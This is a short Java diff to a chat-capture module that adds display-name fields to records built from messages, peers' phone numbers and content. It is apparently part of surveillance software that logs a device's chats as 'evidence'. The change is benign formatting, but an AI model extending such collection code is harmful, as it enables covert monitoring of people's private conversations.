@@ -414,9 +414,15 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			// FROM
 			String from = message.from_me? myPhoneNumber : peer ; 
 			items.add(WChar.getBytes(from, true));
+			// FROM DISPLAY
+			String fromdisplay = message.from_me? myPhoneNumber : peer ; 
+			items.add(WChar.getBytes(fromdisplay, true));
 			// TO
 			String to = message.from_me? peer : myPhoneNumber; 
 			items.add(WChar.getBytes(to, true));
+			// TO DISPLAY
+			String todisplay = message.from_me? peer : myPhoneNumber; 
+			items.add(WChar.getBytes(todisplay, true));
 			// CONTENT
 			items.add(WChar.getBytes(message.data, true));
 			items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));
